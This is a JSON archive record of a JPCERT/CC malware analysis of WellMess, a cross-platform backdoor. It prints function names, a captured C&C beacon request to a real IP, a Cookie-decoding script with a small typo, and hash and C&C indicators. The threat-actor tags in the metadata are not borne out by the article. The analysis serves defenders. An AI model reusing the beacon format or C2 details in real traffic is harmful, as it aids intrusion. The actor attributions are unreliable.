{
    "id": "f9992301-8a73-4f64-be9f-1a55d6eb5a9f",
    "created_at": "2023-01-12T15:03:58.58414Z",
    "updated_at": "2025-03-27T02:17:02.264878Z",
    "deleted_at": null,
    "sha1_hash": "4ebcb269171cf80e5afbd44fdd2e0a9dac1f71fc",
    "title": "2018-07-06 - Malware “WellMess” Targeting Linux and Windows",
    "authors": "",
    "file_creation_date": "2022-05-28T23:44:14Z",
    "file_modification_date": "2022-05-28T23:44:14Z",
    "file_size": 345402,
    "plain_text": "# Malware “WellMess” Targeting Linux and Windows\n\n**[blogs.jpcert.or.jp/en/2018/07/malware-wellmes-9b78.html](https://blogs.jpcert.or.jp/en/2018/07/malware-wellmes-9b78.html)**\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nJuly 6, 2018\n\n[Tool](https://blogs.jpcert.or.jp/en/tags/tool/)\n\n[Email](http://10.10.0.46/mailto:?subject=Malware%20%E2%80%9CWellMess%E2%80%9D%20Targeting%20Linux%20and%20Windows&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2018%2F07%2Fmalware-wellmes-9b78.html)\n\nSome malware is designed to run on multiple platforms, and most commonly they are written\n[in Java. For example, Adwind malware (introduced in a past article) is written in Java, and it](https://blogs.jpcert.or.jp/en/2016/05/decoding-obfuscated-strings-in-adwind.html)\nruns on Windows and other OS. Golang is another programming language, and it is used for\nMirai controller, which infects Linux systems.\n\nThis article introduces the behaviour of WellMess malware based on our observation. It is a\ntype of malware programmed in Golang and cross-compiled to make it compatible both with\nLinux and Windows. For more details about the malware function, please also refer to the\nreport from LAC [1].\n\n**Behaviour of WellMess**\n\n\n-----\n\nGenerally, Golang executable files include many required libraries in itself. This usually\nincreases the file size, making WellMess larger than 3 MB. Another feature is that function\nnames for the executable files can be found in the file itself. (Even for stripped files, function\nnames can be retrieved by using tools such as GoUtils2.0 [2].) Below are the function names\nused in WellMess:\n```\n_/home/ubuntu/GoProject/src/bot/botlib.EncryptText\n_/home/ubuntu/GoProject/src/bot/botlib.encrypt\n_/home/ubuntu/GoProject/src/bot/botlib.Command\n_/home/ubuntu/GoProject/src/bot/botlib.reply\n_/home/ubuntu/GoProject/src/bot/botlib.Service\n_/home/ubuntu/GoProject/src/bot/botlib.saveFile\n_/home/ubuntu/GoProject/src/bot/botlib.UDFile\n_/home/ubuntu/GoProject/src/bot/botlib.Download\n_/home/ubuntu/GoProject/src/bot/botlib.Send\n_/home/ubuntu/GoProject/src/bot/botlib.Work\n_/home/ubuntu/GoProject/src/bot/botlib.chunksM\n_/home/ubuntu/GoProject/src/bot/botlib.Join\n_/home/ubuntu/GoProject/src/bot/botlib.wellMess\n_/home/ubuntu/GoProject/src/bot/botlib.RandStringBytes\n_/home/ubuntu/GoProject/src/bot/botlib.GetRandomBytes\n_/home/ubuntu/GoProject/src/bot/botlib.Key\n_/home/ubuntu/GoProject/src/bot/botlib.GenerateSymmKey\n_/home/ubuntu/GoProject/src/bot/botlib.CalculateMD5Hash\n_/home/ubuntu/GoProject/src/bot/botlib.Parse\n_/home/ubuntu/GoProject/src/bot/botlib.Pack\n_/home/ubuntu/GoProject/src/bot/botlib.Unpack\n_/home/ubuntu/GoProject/src/bot/botlib.UnpackB\n_/home/ubuntu/GoProject/src/bot/botlib.FromNormalToBase64\n_/home/ubuntu/GoProject/src/bot/botlib.RandInt\n_/home/ubuntu/GoProject/src/bot/botlib.Base64ToNormal\n_/home/ubuntu/GoProject/src/bot/botlib.KeySizeError.Error\n_/home/ubuntu/GoProject/src/bot/botlib.New\n_/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).BlockSize\n_/home/ubuntu/GoProject/src/bot/botlib.convertFromString\n_/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).Encrypt\n_/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).Decrypt\n_/home/ubuntu/GoProject/src/bot/botlib.Split\n_/home/ubuntu/GoProject/src/bot/botlib.Cipher\n_/home/ubuntu/GoProject/src/bot/botlib.Decipher\n_/home/ubuntu/GoProject/src/bot/botlib.Pad\n_/home/ubuntu/GoProject/src/bot/botlib.AES_Encrypt\n_/home/ubuntu/GoProject/src/bot/botlib.AES_Decrypt\n_/home/ubuntu/GoProject/src/bot/botlib.generateRandomString\n_/home/ubuntu/GoProject/src/bot/botlib.deleteFile\n_/home/ubuntu/GoProject/src/bot/botlib.Post\n_/home/ubuntu/GoProject/src/bot/botlib.SendMessage\n_/home/ubuntu/GoProject/src/bot/botlib.ReceiveMessage\n_/home/ubuntu/GoProject/src/bot/botlib.Send.func1\n_/home/ubuntu/GoProject/src/bot/botlib.init\n_/home/ubuntu/GoProject/src/bot/botlib.(*KeySizeError).Error\n\n```\n\n-----\n\nAs mentioned earlier, WellMess has a version that runs on Windows (PE) and another on\nLinux (ELF). Although there are some minor differences, they both have the same\nfunctionality.\n\nThe malware communicates with a C&C server using HTTP requests and performs functions\nbased on the received commands. Below is an example of the communication: (User-Agent\nvalue varies per sample.)\n```\nPOST / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html, */*\nAccept-Language: en-US,en;q=0.8\nCookie:\nc22UekXD=J41lrM+S01+KX29R+As21Sur+%3asRnW+3Eo+nIHjv+o6A7qGw+XQr%3aq+PJ9jaI+KQ7G.+FT2wr\nHost: 45.123.190.168\nContent-Length: 426\nExpect: 100-continue\nAccept-Encoding: deflate\nConnection: Keep-Alive\npgY4C8 8JHqk RjrCa R9MS 3vc4Uk KKaRxH R8vg Tfj B3P,C 0RG9lFw DqF405. i3RU1 0lW 2BqdSn\nK3L Y7hEc. tzto yKU8 p1,E L2kKg pQcE1. b8V6S0Y 6akx, ggMcrXk 0csao Uwxn. fYVtWD\nrwt:BJ 5IBn rCMxZoo OsC. :ZXg pKT Re0 cJST1 L0GsC. 9dJZON9 qs29pPB pCTR:8 0hO0FK\nsK13UUw. jMA hDICL hGK1 qjRj1AY YMjAIeI. g7GEZPh gW:C eNX6 ptq kevfIyP. u,96r7c\nD:6ZiR fCC IIi cBvq,p. Vt96aEu JFLeu 0XtFJm ee4S 7M2. Uc68sF MArC5v 96ngG 9UvQGt\n5:ut. qiE0xQ\n\n```\nResults of command execution are send in HTTP POST request data, which is RSAencrypted. The data in Cookie header is RC6-encrypted. Below is an example of decrypted\ndata. It contains an identifier for infected hosts (the value in between <;head;> tags).\n```\n<;head;>6F3C9B16C16074079AFCFF09C6717B0F07864FFE09C1E1DB003B3627D174913B/p<;head;>\n<;title;>a:1_0<;title;><;service;>p<;service;>\n\n```\nBelow is a part of code that decodes data in the Cookie header. (The script is available on\n[Github.)](https://github.com/JPCERTCC/aa-tools/blob/master/wellmess_cookie_decode.py)\n\n\n-----\n\n```\ndef decode(data, key):\n  sep = ';'\n  field = data.split(sep)\n  i = 1\n  encdata = \"\"\n  while i < len(field):\n    value = field[i].split(\"=\")\n    encdata += value[1]\n    I += 1\n  encdata = urllib.unquote(encdata)\n  encdata = encdata.replace(\"+\", \" \").replace(\"  \", \"=\").replace(\". \",\n\"\").replace(\" \", \"\").replace(\",\", \"+\").replace(\":\", \"/\")\n  maindata = base64.b64decode(encdata)\n  s = generateKey(base64.b64decode(key))\n  i = 0\n  decode = \"\"\n  while i < len(maindata):\n    orgi = rc6(maindata[i:i + 16], s)\n    decode += orgi\n    i += 16\n  print(\"Decrypted String: %s\" % decode)\n\n```\nThe malware may perform the following functions when receiving commands from a C&C\nserver.\n\nExecute arbitrary shell command\nUpload/Download files\n\nIn addition, PE file malware executes PowerShell scripts.\n\n**Wellmess Developed in .Net Framework**\n\nThere is also a version that was developed in .Net Framework. Figure 1 shows the code that\ngenerates data contained in the Cookie header upon communicating with a C&C server. It\ncontains the same string as in the Cookie data in the Golang version.\n\nFigure 1: Code to generate data contained in the Cookie\n\n\n-----\n\nWe have no clue about why the actors have prepared two different versions, however, it\nseems that they choose a sample depending on the attack target.\n\n**In closing**\n\nWe have confirmed some cases where WellMess infection was found in Japanese\norganisations. Attacks using the malware may continue.\n\nWe have listed some hash values of the samples in Appendix A. Some of the C&C servers\nthat we have confirmed are also listed in Appendix B. Please make sure that none of your\ndevice is accessing such hosts.\n\n- Shusei Tomonaga\n\n_(Translated by Yukako Uchida)_\n\n**Reference**\n\n[1] LAC: Cyber Emergency Center Report Vol.3 (Japanese)\n\n[https://www.lac.co.jp/lacwatch/pdf/20180614_cecreport_vol3.pdf](https://www.lac.co.jp/lacwatch/pdf/20180614_cecreport_vol3.pdf)\n\n[2] GoUtils2.0\n\n[https://gitlab.com/zaytsevgu/GoUtils2.0/](https://gitlab.com/zaytsevgu/GoUtils2.0/)\n\n**Appendix A: SHA-256 Hash value**\n\n0b8e6a11adaa3df120ec15846bb966d674724b6b92eae34d63b665e0698e0193\n(Golang&ELF)\n\n\n-----\n\nbec1981e422c1e01c14511d384a33c9bcc66456c1274bbbac073da825a3f537d\n(Golang&PE)\n2285a264ffab59ab5a1eb4e2b9bcab9baf26750b6c551ee3094af56a4442ac41\n(.Net&PE)\n\n**Appendix B: C&C server**\n\n45.123.190.168\n103.13.240.46\n101.201.53.27\n185.217.92.171\n93.113.45.101\n191.101.180.78\n\n[Email](http://10.10.0.46/mailto:?subject=Malware%20%E2%80%9CWellMess%E2%80%9D%20Targeting%20Linux%20and%20Windows&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2018%2F07%2Fmalware-wellmes-9b78.html)\n\nAuthor\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nSince December 2012, he has been engaged in malware analysis and forensics\ninvestigation, and is especially involved in analyzing incidents of targeted attacks. Prior to\njoining JPCERT/CC, he was engaged in security monitoring and analysis operations at a\nforeign-affiliated IT vendor. He presented at CODE BLUE, BsidesLV, BlackHat USA Arsenal,\nBotconf, PacSec and FIRST Conference. JSAC organizer.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries. For any questions regarding specific commercial\nproducts, please contact the vendor.\n\nplease change the setting of your browser to set JavaScript valid. Thank you!\n\n## Related articles\n\n\n-----\n\nAnalysis of HUI Loader\n\nAnti-UPX Unpacking Technique\n\nFAQ: Malware that Targets Mobile Devices and How to Protect Them\n\nMalware WinDealer used by LuoYu Attack Group\n\n\n-----\n\nMalware Gh0stTimes Used by BlackTech\n\n\n[Back](https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html)\n[Top](https://blogs.jpcert.or.jp/en/)\n[Next](https://blogs.jpcert.or.jp/en/2018/08/volatility-plugin-for-detecting-cobalt-strike-beacon.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-07-06 - Malware “WellMess” Targeting Linux and Windows.pdf"
    ],
    "report_names": [
        "2018-07-06 - Malware “WellMess” Targeting Linux and Windows.pdf"
    ],
    "threat_actors": [
        {
            "id": "2646f776-792a-4498-967b-ec0d3498fdf1",
            "created_at": "2022-10-25T15:50:23.475784Z",
            "updated_at": "2025-03-27T02:00:55.479958Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Palmerworm"
            ],
            "source_name": "MITRE:BlackTech",
            "tools": [
                "Kivars",
                "PsExec",
                "TSCookie",
                "Flagpro",
                "Waterbear"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d3a7123c-f519-49a0-a234-de24a1ef052a",
            "created_at": "2022-10-25T16:47:55.545211Z",
            "updated_at": "2025-03-27T02:05:17.254744Z",
            "deleted_at": null,
            "main_name": "BRONZE CANAL",
            "aliases": [
                "CTG-6177 ",
                "Circuit Panda ",
                "Palmerworm ",
                "Shrouded Crossbow ",
                "BlackTech"
            ],
            "source_name": "Secureworks:BRONZE CANAL",
            "tools": [
                " DRIGO",
                " Flagpro",
                " Gh0stTimes",
                " PLEAD",
                " Spiderpig",
                " Waterbear",
                "Bifrose"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75024aad-424b-449a-b286-352fe9226bcb",
            "created_at": "2023-01-06T13:46:38.962724Z",
            "updated_at": "2025-03-27T02:00:02.964002Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "CIRCUIT PANDA",
                "Temp.Overboard",
                "G0098",
                "Red Djinn",
                "HUAPI",
                "Palmerworm",
                "T-APT-03",
                "Manga Taurus",
                "Earth Hundun"
            ],
            "source_name": "MISPGALAXY:BlackTech",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "fe3d8dee-3bee-42e6-8f16-b6628b6189ae",
            "created_at": "2023-01-06T13:46:39.039285Z",
            "updated_at": "2025-03-27T02:00:02.98336Z",
            "deleted_at": null,
            "main_name": "SWEED",
            "aliases": [],
            "source_name": "MISPGALAXY:SWEED",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "efa7c047-b61c-4598-96d5-e00d01dec96b",
            "created_at": "2022-10-25T16:07:23.404442Z",
            "updated_at": "2025-03-27T02:02:09.781478Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Circuit Panda",
                "Earth Hundun",
                "Manga Taurus",
                "Operation PLEAD",
                "Operation Shrouded Crossbow",
                "Operation Waterbear",
                "Palmerworm",
                "Radio Panda",
                "Red Djinn",
                "T-APT-03",
                "TEMP.Overboard"
            ],
            "source_name": "ETDA:BlackTech",
            "tools": [
                "BIFROST",
                "BUSYICE",
                "BendyBear",
                "Bluether",
                "CAPGELD",
                "DRIGO",
                "Deuterbear",
                "Flagpro",
                "GOODTIMES",
                "Gh0stTimes",
                "IconDown",
                "KIVARS",
                "LOLBAS",
                "LOLBins",
                "Linopid",
                "Living off the Land",
                "TSCookie",
                "Waterbear",
                "XBOW",
                "elf.bifrose"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f2c53785-fb8b-460d-ba73-7fbfba36f0f5",
            "created_at": "2022-10-25T16:07:24.247949Z",
            "updated_at": "2025-03-27T02:02:10.150345Z",
            "deleted_at": null,
            "main_name": "Sweed",
            "aliases": [],
            "source_name": "ETDA:Sweed",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "ForeIT",
                "Formbook",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "Negasteal",
                "Origin Logger",
                "RDP",
                "Remote Desktop Protocol",
                "ZPAQ",
                "win.xloader"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b72c2616-cc7c-4c47-a83d-6b7866b94746",
            "created_at": "2023-01-06T13:46:39.425297Z",
            "updated_at": "2025-03-27T02:00:03.08718Z",
            "deleted_at": null,
            "main_name": "Red Nue",
            "aliases": [
                "LuoYu"
            ],
            "source_name": "MISPGALAXY:Red Nue",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535838,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1653781454,
    "ts_modification_date": 1653781454,
    "files": {
        "pdf": "https://archive.orkl.eu/4ebcb269171cf80e5afbd44fdd2e0a9dac1f71fc.pdf",
        "text": "https://archive.orkl.eu/4ebcb269171cf80e5afbd44fdd2e0a9dac1f71fc.txt",
        "img": "https://archive.orkl.eu/4ebcb269171cf80e5afbd44fdd2e0a9dac1f71fc.jpg"
    }
}